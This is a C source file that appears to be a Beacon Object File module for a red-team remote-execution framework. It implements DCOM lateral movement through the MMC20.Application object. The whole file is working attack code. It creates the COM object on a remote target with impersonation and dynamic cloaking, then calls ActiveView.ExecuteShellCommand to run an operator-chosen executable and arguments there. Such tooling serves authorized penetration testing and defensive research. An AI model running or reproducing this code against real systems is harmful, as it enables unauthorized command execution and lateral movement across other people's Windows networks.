#define COBJMACROS

#include <oleauto.h>
#include <windows.h>

#include "beacon.h"
#include "com.h"
#include "rex.h"
#include "technique.h"

REX_DEFINE_TECHNIQUE(rex_dcom_mmc20, "dcom-mmc20", "mmc20_active_view",
                     "mmc20_execute_shell_command", REX_DISPOSITION_DISPATCHED);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown *,
                                                        DWORD, COSERVERINFO *,
                                                        DWORD, MULTI_QI *);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown *, DWORD, DWORD,
                                                       OLECHAR *, DWORD, DWORD,
                                                       RPC_AUTH_IDENTITY_HANDLE,
                                                       DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoEnableCallCancellation(LPVOID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoDisableCallCancellation(LPVOID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCancelCall(DWORD, DWORD);
DECLSPEC_IMPORT void WINAPI OLEAUT32$VariantInit(VARIANTARG *);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG *);
DECLSPEC_IMPORT BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR *);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL,
                                                    BOOL, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES,
                                                    SIZE_T,
                                                    LPTHREAD_START_ROUTINE,
                                                    LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForMultipleObjects(DWORD,
                                                             const HANDLE *,
                                                             BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

static const CLSID rex_clsid_mmc20_application = {
    0x49b2791a,
    0xb1ae,
    0x4c90,
    {0x9b, 0x8e, 0xe8, 0x60, 0xba, 0x07, 0xf8, 0x89}};
static const IID rex_iid_dispatch = {
    0x00020400,
    0x0000,
    0x0000,
    {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
static const IID rex_iid_null = {0};

typedef struct {
    wchar_t target[REX_MAX_TARGET + 1];
    wchar_t executable[REX_MAX_COMMAND + 1];
    wchar_t arguments[REX_MAX_COMMAND + 1];
    HANDLE ready_event;
    HANDLE execute_event;
    HANDLE stop_event;
    HANDLE thread;
    DWORD thread_id;
    HRESULT result;
} rex_mmc20_state;

static HRESULT rex_mmc20_proxy(IDispatch *dispatch) {
    return OLE32$CoSetProxyBlanket(
        (IUnknown *)dispatch, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, COLE_DEFAULT_AUTHINFO,
        EOAC_DYNAMIC_CLOAKING);
}

static HRESULT rex_mmc20_dispatch_id(IDispatch *dispatch, const wchar_t *name,
                                     DISPID *id) {
    LPOLESTR names[1];
    names[0] = (LPOLESTR)name;
    return IDispatch_GetIDsOfNames(dispatch, &rex_iid_null, names, 1, 0x0409,
                                   id);
}

static HRESULT rex_mmc20_dispatch_call(IDispatch *dispatch, const wchar_t *name,
                                       WORD flags, VARIANT *arguments,
                                       UINT count, VARIANT *output) {
    DISPID id;
    DISPPARAMS parameters;
    HRESULT result = rex_mmc20_dispatch_id(dispatch, name, &id);
    if (FAILED(result))
        return result;
    rex_zero(&parameters, sizeof(parameters));
    parameters.rgvarg = arguments;
    parameters.cArgs = count;
    return IDispatch_Invoke(dispatch, id, &rex_iid_null, 0x0409, flags,
                            &parameters, output, NULL, NULL);
}

static HRESULT rex_mmc20_dispatch_result(IDispatch *source, const wchar_t *name,
                                         IDispatch **output) {
    VARIANT value;
    HRESULT result;
    *output = NULL;
    OLEAUT32$VariantInit(&value);
    result = rex_mmc20_dispatch_call(source, name, DISPATCH_PROPERTYGET, NULL,
                                     0, &value);
    if (SUCCEEDED(result)) {
        if (V_VT(&value) == VT_DISPATCH && V_DISPATCH(&value) != NULL) {
            *output = V_DISPATCH(&value);
            IDispatch_AddRef(*output);
        } else {
            result = E_NOINTERFACE;
        }
    }
    OLEAUT32$VariantClear(&value);
    if (SUCCEEDED(result))
        result = rex_mmc20_proxy(*output);
    return result;
}

static HRESULT rex_mmc20_execute_command(IDispatch *view,
                                         const rex_mmc20_state *state) {
    VARIANT values[4];
    const wchar_t *strings[4];
    UINT index;
    HRESULT result = S_OK;
    strings[0] = L"7";
    strings[1] = state->arguments;
    strings[2] = L"C:\\";
    strings[3] = state->executable;
    for (index = 0; index < 4; index++)
        OLEAUT32$VariantInit(&values[index]);
    for (index = 0; index < 4; index++) {
        V_VT(&values[index]) = VT_BSTR;
        V_BSTR(&values[index]) = OLEAUT32$SysAllocString(strings[index]);
        if (V_BSTR(&values[index]) == NULL) {
            result = E_OUTOFMEMORY;
            goto cleanup;
        }
    }
    result = rex_mmc20_dispatch_call(view, L"ExecuteShellCommand",
                                     DISPATCH_METHOD, values, 4, NULL);

cleanup:
    for (index = 0; index < 4; index++)
        OLEAUT32$VariantClear(&values[index]);
    return result;
}

static DWORD WINAPI rex_mmc20_worker(LPVOID parameter) {
    rex_mmc20_state *state = (rex_mmc20_state *)parameter;
    COSERVERINFO server;
    MULTI_QI query;
    HANDLE signals[2];
    IDispatch *application = NULL;
    IDispatch *document = NULL;
    IDispatch *view = NULL;
    HRESULT initialized;
    HRESULT result;
    DWORD wait_result;
    BOOL cancellation_enabled = FALSE;
    initialized = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (initialized != S_OK && initialized != S_FALSE) {
        state->result = initialized;
        KERNEL32$SetEvent(state->ready_event);
        return 0;
    }
    result = rex_com_enable_dynamic_cloaking();
    if (FAILED(result))
        goto cleanup;
    result = OLE32$CoEnableCallCancellation(NULL);
    if (FAILED(result))
        goto cleanup;
    cancellation_enabled = TRUE;
    rex_zero(&server, sizeof(server));
    server.pwszName = state->target;
    rex_zero(&query, sizeof(query));
    query.pIID = &rex_iid_dispatch;
    result = OLE32$CoCreateInstanceEx(&rex_clsid_mmc20_application, NULL,
                                      CLSCTX_REMOTE_SERVER, &server, 1, &query);
    if (SUCCEEDED(result))
        result = query.hr;
    if (FAILED(result))
        goto cleanup;
    if (query.pItf == NULL) {
        result = E_NOINTERFACE;
        goto cleanup;
    }
    application = (IDispatch *)query.pItf;
    result = rex_mmc20_proxy(application);
    if (FAILED(result))
        goto cleanup;
    result = rex_mmc20_dispatch_result(application, L"Document", &document);
    if (FAILED(result))
        goto cleanup;
    result = rex_mmc20_dispatch_result(document, L"ActiveView", &view);
    if (FAILED(result))
        goto cleanup;
    state->result = S_OK;
    KERNEL32$SetEvent(state->ready_event);
    signals[0] = state->execute_event;
    signals[1] = state->stop_event;
    wait_result = KERNEL32$WaitForMultipleObjects(2, signals, FALSE, INFINITE);
    if (wait_result == WAIT_OBJECT_0) {
        result = rex_mmc20_execute_command(view, state);
    } else if (wait_result == WAIT_OBJECT_0 + 1) {
        result = S_OK;
    } else {
        result = wait_result == WAIT_FAILED
                     ? HRESULT_FROM_WIN32(KERNEL32$GetLastError())
                     : E_FAIL;
    }

cleanup:
    if (application != NULL) {
        (void)rex_mmc20_dispatch_call(application, L"Quit", DISPATCH_METHOD,
                                      NULL, 0, NULL);
    }
    if (view != NULL)
        IDispatch_Release(view);
    if (document != NULL)
        IDispatch_Release(document);
    if (application != NULL)
        IDispatch_Release(application);
    if (cancellation_enabled)
        (void)OLE32$CoDisableCallCancellation(NULL);
    OLE32$CoUninitialize();
    state->result = result;
    KERNEL32$SetEvent(state->ready_event);
    return 0;
}

static HRESULT rex_mmc20_start(const rex_request *request,
                               rex_mmc20_state **output) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_mmc20_state *state;
    SIZE_T length;
    DWORD wait_result;
    HRESULT result;
    *output = NULL;
    state = (rex_mmc20_state *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY,
                                                  sizeof(rex_mmc20_state));
    if (state == NULL)
        return E_OUTOFMEMORY;
    if (!toWideChar((char *)request->target, state->target,
                    sizeof(state->target))) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    length = rex_wcslen(request->config.shell.executable) + 1;
    rex_copy(state->executable, request->config.shell.executable,
             length * sizeof(wchar_t));
    length = rex_wcslen(request->config.shell.arguments) + 1;
    rex_copy(state->arguments, request->config.shell.arguments,
             length * sizeof(wchar_t));
    state->ready_event = KERNEL32$CreateEventW(NULL, FALSE, FALSE, NULL);
    state->execute_event = KERNEL32$CreateEventW(NULL, FALSE, FALSE, NULL);
    state->stop_event = KERNEL32$CreateEventW(NULL, FALSE, FALSE, NULL);
    if (state->ready_event == NULL || state->execute_event == NULL ||
        state->stop_event == NULL) {
        result = HRESULT_FROM_WIN32(KERNEL32$GetLastError());
        goto cleanup;
    }
    state->result = E_FAIL;
    state->thread = KERNEL32$CreateThread(NULL, 0, rex_mmc20_worker, state, 0,
                                          &state->thread_id);
    if (state->thread == NULL) {
        result = HRESULT_FROM_WIN32(KERNEL32$GetLastError());
        goto cleanup;
    }
    wait_result = KERNEL32$WaitForSingleObject(state->ready_event, INFINITE);
    if (wait_result != WAIT_OBJECT_0) {
        result = wait_result == WAIT_FAILED
                     ? HRESULT_FROM_WIN32(KERNEL32$GetLastError())
                     : E_FAIL;
        goto cleanup;
    }
    *output = state;
    return state->result;

cleanup:
    if (state->thread != NULL) {
        if (state->stop_event != NULL)
            KERNEL32$SetEvent(state->stop_event);
        KERNEL32$WaitForSingleObject(state->thread, INFINITE);
        KERNEL32$CloseHandle(state->thread);
    }
    if (state->stop_event != NULL)
        KERNEL32$CloseHandle(state->stop_event);
    if (state->execute_event != NULL)
        KERNEL32$CloseHandle(state->execute_event);
    if (state->ready_event != NULL)
        KERNEL32$CloseHandle(state->ready_event);
    KERNEL32$HeapFree(heap, 0, state);
    return result;
}

static HRESULT rex_dcom_mmc20_decode(const rex_arguments *arguments,
                                     rex_request *request) {
    if (arguments->values[0][0] == L'\0' || arguments->values[2][0] != L'\0') {
        return E_INVALIDARG;
    }
    request->config.shell.executable = arguments->values[0];
    request->config.shell.arguments = arguments->values[1];
    return S_OK;
}

static HRESULT rex_dcom_mmc20_preflight(const rex_request *request,
                                        rex_state *state) {
    rex_mmc20_state *mmc = NULL;
    HRESULT result = rex_mmc20_start(request, &mmc);
    if (mmc != NULL)
        state->private_data = mmc;
    return result;
}

static HRESULT rex_dcom_mmc20_execute(const rex_request *request,
                                      rex_state *state,
                                      rex_observation *observation) {
    rex_mmc20_state *mmc = (rex_mmc20_state *)state->private_data;
    DWORD wait_result;
    (void)request;
    (void)observation;
    if (!KERNEL32$SetEvent(mmc->execute_event))
        return HRESULT_FROM_WIN32(KERNEL32$GetLastError());
    wait_result = KERNEL32$WaitForSingleObject(mmc->ready_event, 30000);
    if (wait_result == WAIT_TIMEOUT) {
        HRESULT cancel_result = OLE32$CoCancelCall(mmc->thread_id, 0);
        if (FAILED(cancel_result))
            return cancel_result;
        wait_result = KERNEL32$WaitForSingleObject(mmc->ready_event, INFINITE);
        if (wait_result == WAIT_OBJECT_0)
            return HRESULT_FROM_WIN32(ERROR_TIMEOUT);
    }
    if (wait_result != WAIT_OBJECT_0) {
        return wait_result == WAIT_FAILED
                   ? HRESULT_FROM_WIN32(KERNEL32$GetLastError())
                   : E_FAIL;
    }
    return mmc->result;
}

static void rex_dcom_mmc20_release(rex_state *state) {
    rex_mmc20_state *mmc = (rex_mmc20_state *)state->private_data;
    HANDLE heap;
    if (mmc == NULL)
        return;
    KERNEL32$SetEvent(mmc->stop_event);
    KERNEL32$WaitForSingleObject(mmc->thread, INFINITE);
    KERNEL32$CloseHandle(mmc->thread);
    KERNEL32$CloseHandle(mmc->stop_event);
    KERNEL32$CloseHandle(mmc->execute_event);
    KERNEL32$CloseHandle(mmc->ready_event);
    heap = KERNEL32$GetProcessHeap();
    KERNEL32$HeapFree(heap, 0, mmc);
    state->private_data = NULL;
}
